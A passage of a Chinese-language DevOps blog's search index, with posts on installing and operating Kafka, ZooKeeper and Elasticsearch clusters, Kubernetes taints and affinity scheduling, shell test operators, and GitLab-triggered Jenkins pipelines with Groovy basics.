16:04","objectID":"/post/1679/:0:0","tags":["elk","filebeat"],"title":"filebeat6.8.9安装并配置输出日志到kafka","uri":"/post/1679/"},{"categories":["系统服务","ELK日志收集"],"content":"工具均在kafka安装目录中的bin目录下： 为了使用方便我临时做一个别名： alias kfk='sh /usr/local/kafka/bin/kafka-topics.sh --zookeeper elk1:2181,elk2:2181,elk3:2181' ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:0","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"一、显示topic列表 kfk –list ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:1","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"二、创建一个topic，并指定topic属性（副本数、分区数等） –replication-factor ：为topic创建多少个副本 kfk –create –replication-factor 3 –partitions 3 –topic mytopic ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:2","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"三、查看某个topic的状态 kfk –describe –topic mytopic \u003cimg src=“images/d8e3c45c934afbf34f87604e52cf17fe.png “d8e3c45c934afbf34f87604e52cf17fe”” /\u003e 第一行是topic的基本信息 下面三行代表每个topic的分区分布情况 leader 负责读写partiton的节点，每个节点都有可能成为leader。 replicas 当前partition的副本存储在哪些节点，不管该节点是否是leader或者是否存活都会显示。 isr 副本节点中存活的节点列表，并且都和leader同步 mytopic这个Topic举例解释: 编号为0的Partition,Leader在broker.id=2这个节点上.副本分布在broker.id为2,3,1这三个节点. 副本2,3,1处于存活状态，并跟leader(broker.id=2这个节点)同步 编号为1的Partition,Leader在broker.id=3这个节点上.副本分布在broker.id为3,1,2这三个节点. 副本3,1,2处于存活状态，并跟leader(broker.id=3这个节点)同步 ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:3","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"四、生产消息、消费消息 进入生产者控制台： ./kafka-console-producer.sh –broker-list elk1:9092,elk2:9092,elk3:9092 –topic mytopic 进入消费者控制台： ./kafka-console-consumer.sh –bootstrap-server elk1:9092,elk2:9092,elk3:9092 –topic mytopic 此时在生产者控制台输入内容，会直接被消费者取出： \u003cimg src=“images/df819454daf8d640b09c246856fc7bd2.png “df819454daf8d640b09c246856fc7bd2\"” /\u003e \u003cimg src=“images/b3125098248861863b12cd0699d8ca91.png “b3125098248861863b12cd0699d8ca91\"” /\u003e 添加–from-beginning参数可以一次性取出所有消息 ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:4","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"五、删除topic /usr/local/kafka/bin/kafka-topics.sh --zookeeper elk1:2181,elk2:2181,elk3:2181 --delete --topic mytopic ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:5","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"六、删除消费者组 ./kafka-consumer-groups.sh --bootstrap-server elk1:9092,elk2:9092,elk3:9092 --delete --group xxxxx ","date":"2020-05-21 11:35","objectID":"/post/1673/:0:6","tags":["kafka","elk"],"title":"kafka常用基本操作","uri":"/post/1673/"},{"categories":["系统服务","ELK日志收集"],"content":"1.下载安装： wget https://archive.apache.org/dist/kafka/2.0.1/kafka_2.12-2.0.1.tgz tar xf kafka_2.12-2.0.1.tgz mv kafka_2.12-2.0.1 /usr/local/kafka 2.配置zookeeper：可参考https://soulchild.cn/1663.html /usr/local/kafka/config/zookeeper.properties \u003cimg src=“images/780ea5adc1dad0610d228163c140b265.png “780ea5adc1dad0610d228163c140b265\"” /\u003e 创建 /tmp/zookeeper/myid文件 echo 1 \u003e /tmp/zookeeper/myid 启动zookeeper cd /usr/local/kafka/bin ./zookeeper-server-start.sh -daemon ../config/zookeeper.properties 5.配置kafka： 文件路径：/usr/local/kafka/config/server.properties 修改配置文件： #kafka集群的唯一标识，在改变IP地址，不改变broker.id的话不会影响消费者。 #Kafka在启动时会在zookeeper中/brokers/ids路径下创建一个以broker的id为名称的虚节点，Kafka的健康状态检查就依赖于此节点。 #当broker下线时，该虚节点会自动删除，其他broker或者客户端通过判断/brokers/ids路径下是否有此broker的id来确定该broker的健康状态。 broker.id=0 #配置监听地址和端口，listener_name://host_name:port listeners=PLAINTEXT://elk1:9092 #topic不存在时，是否自动创建topic auto.create.topics.enable=true #此项设置为true，删除topic时会真正删除，设置为flase只是标记删除 delete.topic.enable=true #日志和持久化数据目录，指定多路径使用逗号分割 log.dirs=/tmp/kafka-logs #partitions数量建议大于等于消费者数量 num.partitions=6 #保留kafka中消息的时间 log.retention.hours=168 #topic的partition是以一堆segment文件存储的，这个控制每个segment的大小，会被topic创建时的指定参数覆盖 log.segment.bytes=1073741824 #zookeeper集群连接地址和超时时间配置 zookeeper.connect=elk1:2181,elk2:2181,elk3:2181 zookeeper.connection.timeout.ms=6000 # broker处理消息的最大线程数，一般情况下不需要去修改 num.network.threads=3 # broker处理磁盘IO的线程数 ，数值应该大于你的硬盘数 num.io.threads=8 #topic副本数量，如果要部署单机kafka,将值改为1 offsets.topic.replication.factor=3 其他参数详细说明：https://www.cnblogs.com/alan319/p/8651434.html 启动kafka： cd /usr/local/kafka/bin ./kafka-server-start.sh -daemon ../config/server.properties 其他两台机器相同配置，只需要修改broker.id和listeners. ","date":"2020-05-21 10:38","objectID":"/post/1670/:0:0","tags":["kafka","elk"],"title":"kafka2.0.1集群部署","uri":"/post/1670/"},{"categories":["系统服务","ELK日志收集"],"content":"下载地址： https://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz 下载安装： wget https://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz tar xf zookeeper-3.4.14.tar.gz -C /usr/local/ mv /usr/local/zookeeper-3.4.14 /usr/local/zookeeper 配置： 创建配置文件： cp /usr/local/zookeeper/conf/zoo_sample.cfg /usr/local/zookeeper/conf/zoo.cfg 修改配置文件： # 时间单位2000毫秒 tickTime=2000 #集群中的follower服务器(F)与leader服务器(L)之间 初始连接时能容忍的最多心跳数（10*tickTime）即20秒 initLimit=10 # 集群中的follower服务器(F)与leader服务器(L)之间 请求和应答之间能容忍的最多心跳数（5*tickTime）即10秒 syncLimit=5 # 数据目录,没有配置logDir的话log也在此目录 dataDir=/data/zookeeper # 监听端口 clientPort=2181 # 集群其他节点 格式：IP:与leader节点通信的端口:选举时通信的端口 server.1=192.168.0.4:2888:3888 server.2=192.168.0.3:2888:3888 server.3=192.168.0.12:2888:3888 创建数据目录和myid文件： mkdir /data/zookeeper # 文件内容要和配置文件中server.1的1对应 echo 1 \u003e /data/zookeeper/myid 启动服务 cd /usr/local/zookeeper/bin ./zkServer.sh start 启动信息可以在当前目录查看zookeeper.out文件 输入jps命令查看是否有QuorumPeerMain，有即为正常. 其他两台相同配置，只需要注意myid文件的内容 ","date":"2020-05-20 19:30","objectID":"/post/1663/:0:0","tags":["zookeeper"],"title":"zookeeper-3.4.14集群部署配置","uri":"/post/1663/"},{"categories":["系统服务","ELK日志收集"],"content":"Zookeeper集群主要角色有Server和client，其中，Server又分为Leader、Follower和Observer三个角色，每个角色的含义如下： Leader：领导者角色，主要负责投票的发起和决议，以及更新系统状态。集群中只有一个leader。 Follower：跟随者角色，用于接收客户端的请求并返回结果给客户端，在选举过程中参与投票。 Observer：观察者角色，用户接收客户端的请求，并将写请求转发给leader，同时同步leader状态，但不参与投票。 Observer目的是扩展系统，提高伸缩性。 Client:客户端角色，用于向Zookeeper发起请求。 Zookeeper集群中每个Server在内存中存储了一份数据，在Zookeeper启动时，将从实例中选举一个Server作为leader，Leader负责处理数据更新等操作，当且仅当大多数Server在内存中成功修改数据，才认为数据修改成功。 Zookeeper写的流程为：客户端Client首先和集群任意一个节点通信，发起写请求，如果是Follower，Observer节点，则会把写请求转发给leader，Leader再将写请求转发给其它Follower，其它Follower在接收到写请求后写入数据并响应Leader，Leader在接收到半数以上写成功回应后，认为数据写成功，最后响应Client，完成一次写操作过程。 ","date":"2020-05-20 14:15","objectID":"/post/1661/:0:0","tags":["zookeeper"],"title":"zookeeper中不同角色的含义","uri":"/post/1661/"},{"categories":["kubernetes"],"content":"如果一个节点标记为 Taints ，除非 pod 被标识为可以容忍污点节点，否则该 Taints 节点不会被调度 pod。 使用kubeadm搭建的k8s集群，默认master节点是有污点的。 可以通过下面的命令查询污点： kubectl describe nodes test-k8s-master |grep Taints 污点的类型有三种： NoSchedule: 新的pod不能调度过来，但是老的运行在node上不受影响 NoExecute：新的pod不能调度过来，老的pod也会被驱逐 PreferNoSchedule：尽量不调度 添加一个污点： kubectl taint nodes node1 key1=value1:NoSchedule 删除一个污点： kubectl taint nodes node1 key1:NoSchedule- pod.spec.tolerations字段含义： effect：指定污点类型。空意味着匹配所有污点。允许的值为NoSchedule、PreferNoSchedule、NoExecute。 key：指定污点的key。空匹配所有污点的key value：指定污点的value operator：Equal意味着这个值等于value。如果是Exists,则不需要填写value，只要有这个key就容忍 tolerationSeconds：容忍时间，意思为如果被驱逐，则等待定义的时间再去被驱逐，默认是0秒 下面创建一个pod，利用污点创建pod到master节点上： apiVersion: v1 kind: Pod metadata: name: test-nginx-pod labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: http containerPort: 80 tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule nodeSelector: kubernetes.io/hostname: master ","date":"2020-05-18 16:15","objectID":"/post/1657/:0:0","tags":["k8s"],"title":"k8s污点和容忍","uri":"/post/1657/"},{"categories":["kubernetes"],"content":"亲和性调度可以基于： node亲和性(nodeAffinity)：选择调度到相同或不同的node节点 pod亲和性(podAffinity)：和某些pod调度到同一节点 pod反亲和性(podAntiAffinity)：和某些pod调度在不同节点 ","date":"2020-05-18 14:42","objectID":"/post/1651/:1:0","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"亲和性调度可以分成两种策略: ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:0","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"硬策略(requiredDuringSchedulingIgnoredDuringExecution): 指定了将 pod 调度到一个节点上必须满足的规则,不满足则会处于pending状态，一直进行重试，直到满足为止。 ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:1","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"软策略(preferredDuringSchedulingIgnoredDuringExecution): 优先满足指定的规则，如果不满足则会调度到其他节点上。如果有多个软策略还可以设置优先级(weight) ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:2","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"1.节点亲和性 使用节点亲和性硬策略将pod调度到 kubernetes.io/hostname 标签不是test-k8s-node2的节点上，软策略将pod尽量调度到test-k8s-node3节点上 kind: Deployment apiVersion: apps/v1 metadata: name: affinity labels: app: nginx spec: replicas: 4 selector: matchLabels: app: nginx-affinity template: metadata: labels: app: nginx-affinity spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: web containerPort: 80 affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/hostname operator: NotIn values: - test-k8s-node2 preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: kubernetes.io/hostname operator: In values: - test-k8s-node3 \u003cimg src=“images/619f169b3bd0f561fd01cfaa9b316b83.png “619f169b3bd0f561fd01cfaa9b316b83\"” /\u003e operator可选操作：In,NotIn,Exists,DoesNotExist,Gt,Lt ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:3","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"2.pod亲和性 我这里的区域标记是： kubectl label nodes test-k8s-node1 zone=1 kubectl label nodes test-k8s-node3 zone=1 kubectl label nodes test-k8s-node2 zone=2 kubectl label nodes test-k8s-node4 zone=2 首先找到pod中包含app=nginx节点，查看zone标签的值(topologyKey的作用)，假如zone=2，那么该pod会部署在zone=2的区域中。 kind: Deployment apiVersion: apps/v1 metadata: name: affinity labels: app: nginx spec: replicas: 4 selector: matchLabels: app: nginx-affinity template: metadata: labels: app: nginx-affinity spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: web containerPort: 80 affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - nginx topologyKey: zone 直接部署此文件： 均处于pending状态， \u003cimg src=“images/6e4b12bed414292602970e6da1b1843a.png “6e4b12bed414292602970e6da1b1843a”” /\u003e 创建一个标签为app=nginx的pod apiVersion: v1 kind: Pod metadata: name: test-nginx-pod labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: http containerPort: 80 \u003cimg src=“images/9a10c7d11ed9bdb3f1b564ef2a6eb9b8.png “9a10c7d11ed9bdb3f1b564ef2a6eb9b8\"” /\u003e 可以看到这个pod调度到了test-k8s-node1节点上，node1节点的zone值为1，所以刚才的pod会调度到zone=1的节点上 \u003cimg src=“images/df383dcf28313d6cc23101ba881057c1.png “df383dcf28313d6cc23101ba881057c1\"” /\u003e ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:4","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["kubernetes"],"content":"3.pod反亲和性 当前app=nginx的pod被调度在node4节点上 \u003cimg src=“images/9dcf03f24a05ef57c8a1108074f766b8.png “9dcf03f24a05ef57c8a1108074f766b8\"” /\u003e 创建反亲和性的pod kind: Deployment apiVersion: apps/v1 metadata: name: affinity labels: app: nginx spec: replicas: 4 selector: matchLabels: app: nginx-affinity template: metadata: labels: app: nginx-affinity spec: containers: - name: nginx image: nginx:1.14.2 ports: - name: web containerPort: 80 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - topologyKey: kubernetes.io/hostname labelSelector: matchExpressions: - key: app operator: In values: - nginx 可以看到所有pod都不会被调度到node4节点上了 \u003cimg src=“images/27c64623bcb0e0342dc7d3a4760eacb0.png “27c64623bcb0e0342dc7d3a4760eacb0\"” /\u003e ","date":"2020-05-18 14:42","objectID":"/post/1651/:2:5","tags":["k8s"],"title":"k8s亲和性调度","uri":"/post/1651/"},{"categories":["系统服务","databases"],"content":"1.下载elasticsearch wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.8.9.tar.gz 2.解压 tar xf elasticsearch-6.8.9.tar.gz -C /usr/local/ cd /usr/local mv elasticsearch-6.8.9/ elasticsearch 3.系统调优 3.1 修改/etc/sysctl.conf fs.file-max=655360 vm.max_map_count = 262144 fs.file-max主要是配置系统最大打开文件描述符数，建议修改为655360或者更高。 vm.max_map_count影响Java线程数量，用于限制一个进程可以拥有的VMA(虚拟内存区域)的大小，系统默认是65530，建议修改成262144或者更高。 sysctl -p 使内核参数配置生效 3.2 修改/etc/security/limits.conf * soft nproc 20480 * hard nproc 20480 * soft nofile 65536 * hard nofile 65536 * soft memlock unlimited * hard memlock unlimited 修改/etc/security/limit.d/20-nproc.conf * soft nproc 40960 root soft nproc unlimited 退出终端,重新连接使配置生效 3.3 修改JVM参数 JVM调优主要是针对elasticsearch的JVM内存资源进行优化。 elasticsearch的内存资源配置文件为jvm.options。一般设置为服务器物理内存的一半最佳。 vim /usr/local/elasticsearch/config/jvm.options -Xms4g -Xmx4g 4.配置es集群 /usr/local/elasticsearch/config/elasticsearch.yml #集群名称 cluster.name: elkdata #当前节点名称 node.name: server1 #是否可以成为master节点 node.master: true #是否为数据存储节点 node.data: true #数据存储目录 path.data: /data1/elasticsearch,/data2/elasticsearch #日志存储目录 path.logs: /usr/local/elasticsearch/logs #锁定物理内存地址，防止es内存被交换出去，也就是避免es使用swap交换分区，频繁的交换，会导致IOPS变高。 bootstrap.memory_lock: true #监听地址 network.host: 0.0.0.0 #监听端口 http.port: 9200 # es节点之间的tcp通信端口 transport.tcp.port: 9301 #设置集群中master节点的最小数量，不满足时es集群会报错。推荐设置为`master节点数量/2+1`(四舍五入)，可解决脑裂问题 discovery.zen.minimum_master_nodes: 2 #节点之间检测的超时时间 discovery.zen.ping_timeout: 3s #指定集群中所有节点的地址，一般只写可以成为master的 discovery.zen.ping.unicast.hosts: [\"192.168.0.9:9300\",\"192.168.0.10:9300\",\"192.168.0.11:9300\"] #解决使用head时的跨域问题 #http.cors.allow-origin: \"*\" #http.cors.enabled: true discovery.zen.minimum_master_nodes参数的更详细说明以及脑裂说明：https://www.cnblogs.com/zhukunrong/p/5224558.html 5.启动集群 5.1 创建启动用户、授权 useradd elasticsearch chown -R elasticsearch.elasticsearch /usr/local/elasticsearch/ 5.2 创建数据目录 mkdir /data{1..2}/elasticsearch -p chown -R elasticsearch.elasticsearch /data{1..2} 5.3 启动 su -s /bin/bash elasticsearch -c \"/usr/local/elasticsearch/bin/elasticsearch -d\" ","date":"2020-05-15 15:12","objectID":"/post/1646/:0:0","tags":["es","elasticsearch"],"title":"Elasticsearch 6.8.9集群安装","uri":"/post/1646/"},{"categories":["基础内容"],"content":"[ -a FILE ] 如果 FILE 存在则为真。 [ -b FILE ] 如果 FILE 存在且是一个块特殊文件则为真。 [ -c FILE ] 如果 FILE 存在且是一个字特殊文件则为真。 [ -d FILE ] 如果 FILE 存在且是一个目录则为真。 [ -e FILE ] 如果 FILE 存在则为真。 [ -f FILE ] 如果 FILE 存在且是一个普通文件则为真。 [ -g FILE ] 如果 FILE 存在且已经设置了SGID则为真。 [ -h FILE ] 如果 FILE 存在且是一个符号连接则为真。 [ -k FILE ] 如果 FILE 存在且已经设置了粘制位则为真。 [ -p FILE ] 如果 FILE 存在且是一个名字管道(F如果O)则为真。 [ -r FILE ] 如果 FILE 存在且是可读的则为真。 [ -s FILE ] 如果 FILE 存在且大小不为0则为真。 [ -t FD ] 如果文件描述符 FD 打开且指向一个终端则为真。 [ -u FILE ] 如果 FILE 存在且设置了SUID (set user ID)则为真。 [ -w FILE ] 如果 FILE 如果 FILE 存在且是可写的则为真。 [ -x FILE ] 如果 FILE 存在且是可执行的则为真。 [ -O FILE ] 如果 FILE 存在且属有效用户ID则为真。 [ -G FILE ] 如果 FILE 存在且属有效用户组则为真。 [ -L FILE ] 如果 FILE 存在且是一个符号连接则为真。 [ -N FILE ] 如果 FILE 存在 and has been mod如果ied since it was last read则为真。 [ -S FILE ] 如果 FILE 存在且是一个套接字则为真。 [ FILE1 -nt FILE2 ] 如果 FILE1 has been changed more recently than FILE2, or 如果 FILE1 exists and FILE2 does not则为真。 [ FILE1 -ot FILE2 ] 如果 FILE1 比 FILE2 要老, 或者 FILE2 存在且 FILE1 不存在则为真。 [ FILE1 -ef FILE2 ] 如果 FILE1 和 FILE2 指向相同的设备和节点号则为真。 [ -o OPTIONNAME ] 如果 shell选项 “OPTIONNAME” 开启则为真。 [ -z STRING ] “STRING” 的长度为零则为真。 [ -n STRING ] or [ STRING ] “STRING” 的长度为非零 non-zero则为真。 [ STRING1 == STRING2 ] 如果2个字符串相同。 “=” may be used instead of “==” for strict POSIX compliance则为真。 [ STRING1 != STRING2 ] 如果字符串不相等则为真。 ","date":"2020-05-09 18:16","objectID":"/post/1643/:0:0","tags":["shell"],"title":"Shell中判断语句if中-z至-d的意思","uri":"/post/1643/"},{"categories":["devops"],"content":"1.配置jenkins（需要先安装Generic Webhook Trigger插件） 获取gitlab提交的分支，赋给变量branch \u003cimg src=“images/47e886e74992bbb1db166215aff11199.png “47e886e74992bbb1db166215aff11199\"” /\u003e 加一个webhook参数，用于判断触发构建的类型： \u003cimg src=“images/ae0bf0a61e6a907d7d33033868aec526.png “ae0bf0a61e6a907d7d33033868aec526\"” /\u003e 填写token： \u003cimg src=“images/6591b3162d6c9dbfb09827db52c77016.png “6591b3162d6c9dbfb09827db52c77016\"” /\u003e 打印相关内容和变量，方便调试： \u003cimg src=“images/7ceff1dba92b85144a08e3bf3d9cc0f4.png “7ceff1dba92b85144a08e3bf3d9cc0f4\"” /\u003e 2.gitlab配置 URL：http://10.0.0.51:8080/generic-webhook-trigger/invoke?token=demo-maven-service_PUSH\u0026runType=gitlabpush \u003cimg src=“images/1133196075888fece5a27d21b51f87a6.png “1133196075888fece5a27d21b51f87a6\"” /\u003e 修改pipeline动态获取分支名称 #!groovy @Library('jenkins-sharelibrary@master') def tools = new org.devops.tools() String srcUrl = \"${env.srcUrl}\" String branchName = \"${env.branchName}\" String buildType = \"${buildType}\" String buildShell = \"${buildShell}\" try{ if ( \"${runType}\" == \"gitlabpush\" ){ branchName = \"${branch}\" } }catch(Exception e){ println(branchName) } currentBuild.description = \"构建分支：${branchName}\" pipeline{ agent { node { label 'master'} } stages{ stage('GetCode'){ steps{ script{ tools.myprint(\"正在拉取代码\",\"green\") checkout([$class: 'GitSCM', branches: [[name: \"${branchName}\"]], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: '476e5130-258c-4e7e-a80e-4ea8a303a985', url: \"${srcUrl}\"]]]) } } } stage('Build'){ steps{ script{ tools.build(\"${buildType}\",\"${buildShell}\") } } } } } ","date":"2020-05-08 14:08","objectID":"/post/1636/:0:0","tags":["jenkins"],"title":"gitlab提交代码自动触发jenkins pipeline","uri":"/post/1636/"},{"categories":["devops"],"content":"1.安装插件 \u003cimg src=“images/256dcf851f0670bb1e8b393133e1f1ae.png “256dcf851f0670bb1e8b393133e1f1ae”” /\u003e 2.配置github \u003cimg src=“images/bad7c0b224edd9ba8af1ee8c23564a0b.png “bad7c0b224edd9ba8af1ee8c23564a0b”” /\u003e \u003cimg src=“images/6a26a2601adec8815c5217bc4f3d3657.png “6a26a2601adec8815c5217bc4f3d3657\"” /\u003e 添加一个应用 \u003cimg src=“images/41b2cafc848fbcc0e45a6f21e091f40b.png “41b2cafc848fbcc0e45a6f21e091f40b”” /\u003e 记录ClientID和Secret \u003cimg src=“images/3f5628b56b61015a6083cb08fe634bff.png “3f5628b56b61015a6083cb08fe634bff”” /\u003e 3.配置jenkins \u003cimg src=“images/e8eb3b431102acf9fc836c2c2cf7cd7c.png “e8eb3b431102acf9fc836c2c2cf7cd7c”” /\u003e 保存后退出登陆，发现没有权限了，比如这样。。。 \u003cimg src=“images/fa5a06ed24c2669b8f2adddb02edaa85.png “fa5a06ed24c2669b8f2adddb02edaa85\"” /\u003e 解决方法： 修改jenkins的config.xml文件 在\u003cassignedSIDs\u003e字段中添加\u003csid\u003e你的用户名\u003c/sid\u003e \u003cimg src=“images/607e145cf1ac344eea47987fcd67b6bc.png “607e145cf1ac344eea47987fcd67b6bc”” /\u003e 保存后重启即可。 ","date":"2020-05-08 09:32","objectID":"/post/1633/:0:0","tags":["jenkins"],"title":"jenkins集成github登陆","uri":"/post/1633/"},{"categories":["其他","devops"],"content":"两种方式解决： 第一种：创建node软连接到/usr/sbin目录下 ln -s /application/node-v14.2.0-linux-x64/bin/node /usr/sbin/node 第二种： 在执行sh时添加环境变量 pipeline{ agent { node { label \"master\" } } parameters{ choice(choices: [\"-v\",\"build\"],description: \"npm\",name: \"buildShell\") } stages{ stage(\"npm构建\"){ steps{ script{ nodejs_home = tool \"NPM\" sh \"export PATH=\\$PATH:${nodejs_home}/bin \u0026\u0026 ${nodejs_home}/bin/npm ${buildShell}\" } } } } } ","date":"2020-05-07 17:54","objectID":"/post/1628/:0:0","tags":["jenkins","pipeline"],"title":"jenkins中env: node: No such file or directory","uri":"/post/1628/"},{"categories":["其他","devops"],"content":"定义一个函数： def myprint(content){ print(content) return true } 调用函数： myprint('内容') ","date":"2020-05-07 15:39","objectID":"/post/1625/:0:0","tags":["jenkins","groovy"],"title":"groovy函数使用","uri":"/post/1625/"},{"categories":["其他","devops"],"content":"if判断：   \u003cimg src=“images/0433827c0e1eb173988a69e5d011faa6.png “0433827c0e1eb173988a69e5d011faa6\"” /\u003e switch判断：   \u003cimg src=“images/ef4a12a0a62204c7409a8f3d7417e0df.png “ef4a12a0a62204c7409a8f3d7417e0df”” /\u003e for循环： ","date":"2020-05-07 14:50","objectID":"/post/1623/:0:0","tags":["jenkins","groovy"],"title":"groovy逻辑和循环语句","uri":"/post/1623/"},{"categories":["其他","devops"],"content":"字符串：   contains：是否包含指定字符串 \u003cimg src=“images/1d8508380caa8681e6cf3c65f75d9016.png “1d8508380caa8681e6cf3c65f75d9016\"” /\u003e endsWith：是否以什么结尾 \u003cimg src=“images/f9e19d1574f4083ba5cdf0c84b4f83aa.png “f9e19d1574f4083ba5cdf0c84b4f83aa”” /\u003e size和length：统计字符串长度 \u003cimg src=“images/3ecb652e315bf397f5d06f01e38a882d.png “3ecb652e315bf397f5d06f01e38a882d”” /\u003e toUpperCase和toLowerCase：大小写转换 \u003cimg src=“images/f304a80a596ac4a6a05b474c30e5e583.png “f304a80a596ac4a6a05b474c30e5e583\"” /\u003e 列表：   split：分割文本 \u003cimg src=“images/9017ae55af1d2a0bc260a042db5a93ad.png “9017ae55af1d2a0bc260a042db5a93ad”” /\u003e unique：列表去重 \u003cimg src=“images/1422662660852808ed678195b3bb94d8.png “1422662660852808ed678195b3bb94d8\"” /\u003e join：将列表中每个元素链接 \u003cimg src=“images/bac2471f317addd125ca6aa1655b60af.png “bac2471f317addd125ca6aa1655b60af”” /\u003e 字典：   基本操作： \u003cimg src=“images/4239bcf777fd4f2a524a43612ace7107.png “4239bcf777fd4f2a524a43612ace7107\"” /\u003e 添加和删除： \u003cimg src=“images/cfcebbd66ec4e8539ea8c143e345c794.png “cfcebbd66ec4e8539ea8c143e345c794\"” /\u003e ","date":"2020-05-07 14:01","objectID":"/post/1619/:0:0","tags":["jenkins","groovy"],"title":"groovy常用方法","uri":"/post/1619/"},{"categories":["devops"],"content":"agent any：任意节点执行流水线 node：默认 label：在指定的agent上执行流水线 node：agent { node { label ’labelName’ } }和 agent { label ’labelName’ }相同，但node允许其他选项（如customWorkspace指定工作空间目录） options buildDiscarder 持久化工件和控制台输出，用于最近Pipeline运行的具体数量。例如：options { buildDiscarder(logRotator(numToKeepStr: ‘1’)) } disableConcurrentBuilds 不允许并行执行Pipeline。可用于防止同时访问共享资源等。例如：options { disableConcurrentBuilds() } skipDefaultCheckout 在agent指令中默认跳过来自源代码控制的代码。例如：options { skipDefaultCheckout() } skipStagesAfterUnstable 一旦构建状态进入了“不稳定”状态，就跳过阶段。例如：options { skipStagesAfterUnstable() } timeout 设置Pipeline运行的超时时间，之后Jenkins应该中止Pipeline。例如：options { timeout(time: 1, unit: ‘HOURS’) } retry 失败后，重试整个Pipeline指定的次数。例如：options { retry(3) } timestamps 在控制台输出运行时间。例如：options { timestamps() } post always 运行，无论Pipeline运行的完成状态如何。 changed 只有当前Pipeline运行的状态与先前完成的Pipeline的状态不同时，才能运行。 failure 仅当当前Pipeline处于“失败”状态时才运行，通常在Web UI中用红色指示表示。 success 仅当当前Pipeline具有“成功”状态时才运行，通常在具有蓝色或绿色指示的Web UI中表示。 unstable 只有当前Pipeline具有“不稳定”状态，通常由测试失败，代码违例等引起，才能运行。通常在具有黄色指示的Web UI中表示。 aborted 只有当前Pipeline处于“中止”状态时，才会运行，通常是由于Pipeline被手动中止。通常在具有灰色指示的Web UI中表示。 environment 该environment指令指定一系列键值对，这些对值将被定义为所有步骤或阶段特定步骤的环境变量，具体取决于environment指令位于Pipeline中的位置。 该指令支持一种特殊的帮助方法credentials()，可以通过其在Jenkins环境中的标识符来访问预定义的凭据。对于类型为“Secret Text”的凭据，该 credentials()方法将确保指定的环境变量包含Secret Text内容。对于“标准用户名和密码”类型的凭证，指定的环境变量将被设置为， username:password并且将自动定义两个附加的环境变量：MYVARNAME_USR和MYVARNAME_PSW相应的。 pipeline { agent any environment { CC = 'clang' } stages { stage('Example') { environment { AN_ACCESS_KEY = credentials('my-prefined-secret-text') } steps { sh 'printenv' } } } } parameters 参数化构建 string 字符串类型的参数： parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') } booleanParam 布尔参数： parameters { booleanParam(name: 'DEBUG_BUILD', defaultValue: true, description: '') } pipeline { parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') booleanParam(name: 'DEBUG_BUILD', defaultValue: true, description: '') } agent any stages { stage(\"Example\") { steps { println(\"${DEPLOY_ENV}\") println(\"$DEBUG_BUILD\") } } } tool 获取通过自动安装或手动放置工具的环境变量。支持maven/jdk/gradle。工具的名称必须在系统设置-\u003e全局工具配置中定义。 需要在jenkins配置maven环境，名称为apache-maven-3.0.1 pipeline { agent any tools { maven 'apache-maven-3.0.1' } stages { stage('Example') { steps { sh 'mvn --version' } } } } input input用户在执行各个阶段的时候，由人工确认是否继续进行。 message 呈现给用户的提示信息。 id 可选，默认为stage名称。 ok 默认表单上的ok文本。 submitter 可选的,以逗号分隔的用户列表或允许提交的外部组名。默认允许任何用户。 submitterParameter 环境变量的可选名称。如果存在，用submitter 名称设置。 parameters 提示提交者提供的一个可选的参数列表。 pipeline { parameters { string(name: 'DEPLOY_ENV', defaultValue: 'staging', description: '') booleanParam(name: 'DEBUG_BUILD', defaultValue: true, description: '') } agent any stages { stage(\"Example\") { steps { println(\"${DEPLOY_ENV}\") println(\"$DEBUG_BUILD\") input message: '继续执行', ok: '是的，执行', parameters: [text(defaultValue: 'None', description: '', name: 'content')], submitter: 'admin' } } } }   when when 